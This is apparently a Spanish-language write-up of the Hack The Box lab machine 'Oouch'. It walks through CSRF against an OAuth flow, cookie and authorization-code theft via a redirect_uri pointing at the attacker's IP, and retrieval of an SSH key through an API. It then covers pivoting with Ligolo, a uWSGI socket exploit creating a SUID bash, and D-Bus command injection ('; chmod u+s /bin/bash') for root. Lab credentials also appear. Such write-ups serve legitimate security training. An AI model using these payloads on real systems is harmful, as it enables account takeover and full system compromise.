------
- Tags:
-------
## Tecnicas utilizadas
- FTP Enumeration  
- Abusing OAuth Endpoint  
- Virtual Hosting Enumeration  
- Breaking OAuth Logic - Authorize as Administrator  
- Registering a new application - Django Docs  
- Abusing Authorization Workflow  
- Token Stealing  
- Playing with Bearer Tokens - Abusing Authentication  
- Information Leakage  
- Host Discovery y Port Discovery  
- UWSGI Exploitation [RCE] - User Pivoting  
- Abusing DBUS Message [Privilege Escalation]
------
![[Pasted image 20240108213952.png]]

## Reconocimiento
Si lanzamos un **Nmap** sobre los puertos activos en el servidor podemos ver los siguientes servicios:
```ruby
# nmap -sCV -p21,22,5000,8000 10.129.93.179 -oN Ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 16:36 PST
WARNING: Service 10.129.93.179:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.129.93.179
Host is up (0.48s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.204
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.129.93.179:5000/login?next=%2F
8000/tcp open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=1/9%Time=659DE6A3%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)
SF:</h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20R
SF:equest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<
SF:h1>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorizati
SF:on\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.
SF:0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Au
SF:thorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.40 seconds
```

Si lanzamos un **WhatWeb** sobre la pagina web que esta corriendo en el puerto **5000** podemos ver las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.129.93.179:5000
http://10.129.93.179:5000 [302 Found] Cookies[session], Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], HttpOnly[session], IP[10.129.93.179], RedirectLocation[http://10.129.93.179:5000/login?next=%2F], Title[Redirecting...], probably Werkzeug, nginx[1.14.2]
```

Al visitar la pagina nos aplica un redireccionamiento a un Login al cual de primeras no podemos ingresar. Podriamos intetar alguna inyección **SQL** pero parece ser que esta bien sanitizado la entrada de texto.
![[Pasted image 20240109164333.png]]

## FTP Enumeration  
Por otro lado, tenemos el servicio **FTP** corriendo en el puerto **21**. Este tiene activado el ingreso **Anonimo** habilitado asi que podriamos descargar aquello que se nos ofrece.
![[Pasted image 20240109164848.png]]

El archivo de texto nos revela alguna de las tecnologías utilizadas en el backend(creo):
```r
# catn project.txt
Flask -> Consumer
Django -> Authorization Server
```

## Abusing OAuth Endpoint  
Volviendo al sitio web, también tenemos la opcion de crear una cuenta. Una vez con la cuenta creada, podemos entrar y nos reciben con un mensaje.
![[Pasted image 20240109165450.png]]

Basicamente nos dice que la pagina aún sigue en desarrollo, y que, puede tener alguno que otros errores. Asi mismo, nos indica que todos nuestros datos se mantendran privados.

Tenemos una sección de contacto que al momento de intentar mandar algún payload que pretenda explotar un **XSS** nos bloquea la IP durante un minuto entero.
![[Pasted image 20240109170810.png]]

Por otro lado, podemos hacer un escaneo sobre directorios web existentes con **Gobuster** o **Wfuzz**, al hacerlo, encontramos algunos directorios extras como el de **OAUTH**.
![[Pasted image 20240109171419.png]]

Al visitar **OAUTH** nos reciben como el siguiente mensaje:
![[Pasted image 20240109171518.png]]

Basicamente nos habla de que la funcionalidad esta en producción y que aun no esta lista, también nos ofrecen otros dos URL. De estos URL podemos rescatar el dominio **oouch.htb** y colocarlo en el `/etc/hosts` para intentar hacer un fuzzing de subdominios.

Al visitar el primero nos redirecciona a un subdominio de nombre **Authorization** el cual tendremos que contemplar también en el `/etc/hosts`
![[Pasted image 20240109172704.png]]

Al reiniciar la pagina(con el subdominio ya colocado en el hosts) podremos ver una pagina para iniciar sesión,
![[Pasted image 20240109172806.png]]

A su vez, podemos intuir que como existe un login, también podria existen un **SignUp** que es para crear una cuenta, si visitamos la pagina vemos que si existe.
![[Pasted image 20240109202445.png]]

## Virtual Hosting Enumeration 
Como se mencionaba antes, con el dominio **oouch.htb** descubierto, podriamos intentar descubrir algunos más con **Gobuster** pero al final no hay otro más aparte del mencionado **consumer** del directorio que descubrimos.
![[Pasted image 20240109172323.png]]

## Breaking OAuth Logic - Authorize as Administrator  

Volviendo dos puntos antes, vamos aprovecharnos del apartado de Autorizacion para abusar del CSRF que esta e el apartado de conectado, ya que al colocar cualquier enlace, automaticamente un "Sujeto" da click.
Bien, lo haremos de la siguiente manera, vamos a visitar el enlace
![[Pasted image 20240130193832.png]]

Una vez dentro, vamos a darle a "Authorize" y capturar la peticion con BurpSuite 
![[Pasted image 20240130193930.png]]

En Burpsuite, vamos a mandar esta peticion. La que realmente importa es la siguiente que hace, ya que esta trae el token correspondiente a nuestra cuenta para autorizar que se conecten a la cuenta, en este caso MI usuario TEST se conectara a la cuenta del otro usuario.

![[Pasted image 20240130194115.png]]

Vamos a copiar toda la peticion y la vamos a mandar en el apartado de contacto para que el que esta vigilando de click y nos permita conectarnos a su cuenta.

![[Pasted image 20240130194330.png]]

Lo mandademos y esperamos algunos segundos, cuando, en el apartado de nuestro perfil aparezca que no tenemos la cuenta **TEST** conectada, quiere decir que ya podriamos aprovecharnos del OAUTH/CONNECT para meternos como el otro usuario.
![[Pasted image 20240130194434.png]]

En la siguiente foto muestra como se veria cuando el usuario ya se conecto
![[Pasted image 20240130194727.png]]

Ahora nos deslogueamos como el usuario **Sexcott**, e iremos al apartado de conexion para conectarnos, cuando entramos estaremos como **qtc** 
![[Pasted image 20240130195206.png]]

Aqui como **qtc**

![[Pasted image 20240130195721.png]]

## Registering a new application - Django Docs  
Una vez como el usuario **qtc** podemos ver un apartado que de antes no podiamos de nombre **Documents**
![[Pasted image 20240130195921.png]]

Basicamente vienen unas claves de acceso, nos mencionan tambien un endpoint de una api y por ultimo hacen una pequeña broma hacer de un SSH Filtrado, queremos creer que este es filtrado a traves de la misma funcionalidad de la API.

Algo que podemos hacer ahora que no hicimos antes es fuzzear por directorios dentro de la carpeta **OAUTH** en busca de otras funcionalidades
![[Pasted image 20240130200921.png]]

Encontramos justamente **Aplications** que nos mencionaba en **Documents** con la cual podremos registrar nuevas aplicaciones Cabe mencionar que tenemos que visitar explicitamente la ruta **/applications/register**
Una vez dentro se nos permite registrar una aplicacion
![[Pasted image 20240202155928.png]]

A continuacion intentaremos robar la cookie de QTC creando una aplicacion y haciendo que estas mismo la autorice.
El Formulario quedaria tal que asi
![[Pasted image 20240202160923.png]]

## Abusing Authorization Workflow 
En redirect colocamos nuestra IP dado que esto nos mandera las cookies en el encabezado cuando QTC entre
El payload final saria el siguiente:
`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=d8zS8VvoYpA0fIdyroWb2H9l9G9YFIx1v3HeBo33&redirect_uri=http://10.10.14.153/&grant_type=authorization_code&client_secret=qF9Vt5eGCo38B2tyjVrVoTv640COJIcW5Qdqjuk6YWjdN4hedZxM6Bg8kpEYCFyFag6odMCRVyQBE8E69vKKdMcpJX9SU7UT9e6p3csmvTVYClnfnNpGzVtjXxQwdzIr`

Ahora, se lo mandaremos por la seccion de contacto como lo hicimos anteriormente
![[Pasted image 20240202161348.png]]
Lo mandamos y por otro lado con nuestro oyente de netcat nos caera la peticion:
![[Pasted image 20240202161616.png]]

## Token Stealing 
Con esta cookie, vamos a suplantar al usuario QTC en la web de authorization:
![[Pasted image 20240202161913.png]]
![[Pasted image 20240202161933.png]]

Ahora, lo que haremos sera crear otra aplicacion la cual permitira sacar el authorization token del usuario 
## Playing with Bearer Tokens - Abusing Authentication 
Falta conseguir el token del usuario QTC para asi poder coger su SSH que menciona en su pagina principal. Para hacer esto, jugaremos con los token que nos otorgan las aplicaciones al momento de autorizarlas. Vamos a generar nuestro token con la siguiente peticion y poniendonos en escucha en el puerto 80 con netcat:
![[Pasted image 20240202170839.png]]
Al mandarla nos llegara esta peticion
![[Pasted image 20240202170925.png]]

ahi contemplamos nuestro code, este mismo lo usaremos para solicitar el token que usaremos para coger informacion del usuario
![[Pasted image 20240202171012.png]]

El **Client_id** lo sacamos del la aplicacion que creamos con anterioridad. Al mandar la peticion, el servidor nos responde con los datos del token
![[Pasted image 20240202171110.png]]

Para conseguir el token del QTC ahora intentaremos abusar del CSRF de antes para que se nos tramite el token. Asi que mandaremos el siguiente payload en el formulario de contacto y nos pondremos en escucha
`http://authorization.oouch.htb:8000/oauth/authorize/?redirect_uri=http://10.10.14.153/&scope=read&client_id=d8zS8VvoYpA0fIdyroWb2H9l9G9YFIx1v3HeBo33&state=&response_type=code&allow=Authorize`

Lo mandamos y esperamos la respuesta
![[Pasted image 20240202172258.png]]
![[Pasted image 20240202172346.png]]

Con este codigo, obtendremos el token del usuario QTC
![[Pasted image 20240202172440.png]]

## Information Leakage
![[Pasted image 20240202172532.png]]

Lo siguiente sera mandar una peticion a **/api/get_ssh** para obtener la id_rsa del usuario
![[Pasted image 20240202172818.png]]

Lo copiamos a un archivo e intentamos conectarnos a la maquina
![[Pasted image 20240202172937.png]]

## Host Discovery y Port Discovery
Para la parte del host discovery y port discovery yo usare Ligolo para facilitar el pivoting desde mi maquina.
```
sudo ip tuntap add user $USER mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
sudo ip route add 172.18.0.0/24 dev ligolo
sudo ip route add 172.17.0.0/24 dev ligolo
```

en nuestra maquina iniciamos el proxy
```
./proxy -selfcert
```

En la maquina victima ejecutamos esto
```
./agent -connect 10.10.14.153:11601 -ignore-cert &
```

Y iniciamos la sesion en nuestro proxy
```
[Agent : qtc@oouch] » INFO[0024] Starting tunnel to qtc@oouch                 
WARN[0024] Lost connection with agent qtc@oouch!        
[Agent : qtc@oouch] » 
ligolo-ng » session
? Specify a session : 2 - qtc@oouch - 10.129.35.232:47080
[Agent : qtc@oouch] » start
[Agent : qtc@oouch] » INFO[0029] Starting tunnel to qtc@oouch  
```

Ahora lanzamos un fping para descubrir todos los hosts existentes en ambos segmentos de red
![[Pasted image 20240202173928.png]]

![[Pasted image 20240202174017.png]]

La IP 172.18.0.4 tiene el SSH activado, ademas, en nuestra .ssh tenemos una clave publica, quizas podemos iniciar una sesion ssh sin proporcinar contraseña a la maquina
```
qtc@oouch:~/.ssh$ ssh qtc@172.18.0.4 -i id_rsa 
The authenticity of host '172.18.0.4 (172.18.0.4)' can't be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.4' (ED25519) to the list of known hosts.
Linux 552b83dd44a2 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@552b83dd44a2:~$ hostname
552b83dd44a2
```
 Haciendo una enumeracion basica de procesos podemos encontrar que la maquina corre un proceso de nombre uWSGI
 ![[Pasted image 20240202192211.png]]
Este normalmente se utiliza para ejecutar aplicaciones web de python. Enumerando un poco mas encontramos una carpeta de nombre code en la raiz del sistema la cual contiene un archivo de configuracion con el siguiente contenido:
```
$ cat config.py 
import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    # ...
    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
```
Ademas encontramos un archivo **ini** el cual nos detalla mas informacion
```
qtc@552b83dd44a2:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

Investigando un poco mas encontramos la manera en la que qtc se comunica y es atraves de un bus
![[Pasted image 20240202192921.png]]
## UWSGI Exploitation [RCE] - User Pivoting
Si leemos el archivo vemos quee efectivamente se trata de un bus. Para abusar de esto, podemos hacer uso de un exploit que encontramos en Google. Basicamente, tenemos que subir el exploit a la maquina, nc y listo. Cabe mencionar que al exploit se le deben de borrar las lineas donde hace uso de la libreria **Bytes** por que da un problema.
Ejecutamos el script para copiar la bash y otorgarle permisos SUID para ganar una bash como www-data
```
$ python3 exploit.py -m unix -u uwsgi.socket -c "cp /bin/bash /tmp/bash"
[*]Sending payload.

$ python3 exploit.py -m unix -u uwsgi.socket -c "chmod u+s /tmp/bash"
[*]Sending payload.

$ ls -la bash 
-rwsr-xr-x 1 www-data www-data 1168776 Feb  3 04:23 bash

$ ./bash -p

bash-5.0$ whoami
www-data
```
 
## Abusing DBUS Message [Privilege Escalation]
Una vez como www-data, vamos aprovechar el DBUS que como qtc no teniamos permisos, para escalar privilegios. Vamos a mandar un mensaje al BUS con un Payload para obtener una shell como root.
```
$ Dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block "; chmod u+s /bin/bash"
```

Y ya podriamos ejecutar la bash como el usuario **root** usando **bash -p**







 


